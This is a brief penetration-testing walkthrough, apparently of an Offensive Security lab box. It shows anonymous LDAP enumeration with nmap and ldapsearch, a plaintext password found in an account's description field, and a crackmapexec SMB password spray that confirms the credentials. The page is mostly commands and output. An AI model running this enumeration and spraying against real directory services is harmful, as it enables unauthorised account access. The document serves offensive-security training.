---
description: Misconfigured LDAP service.
---

# LDAP

```
nmap -n -sV --script "ldap* and not brute" 192.168.99.122

$ ldapsearch -x -h 192.168.99.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName:

sAMAccountName: Guest
sAMAccountName: Domain Computers
sAMAccountName: Cert Publishers
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: rplacidi
sAMAccountName: opatry
sAMAccountName: ltaunton
sAMAccountName: acostello
sAMAccountName: jsparwell
sAMAccountName: oknee
sAMAccountName: jmckendry
sAMAccountName: avictoria
sAMAccountName: jfrarey
sAMAccountName: eaburrow
sAMAccountName: cluddy
sAMAccountName: agitthouse
sAMAccountName: fmcsorley

$ ldapsearch -x -h 192.168.99.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description

description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Password set to CrabSharkJellyfish192 at user's request. Please c
```

```
$ crackmapexec smb 192.168.99.122 -u users.txt -p CrabSharkJellyfish192

SMB         192.168.99.122  445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
```

We have a password in the last line which we can correlate with being the last users in the entry list of fmcsorley for the combined credentials of **fmcsorley:CrabSharkJellyfish192**
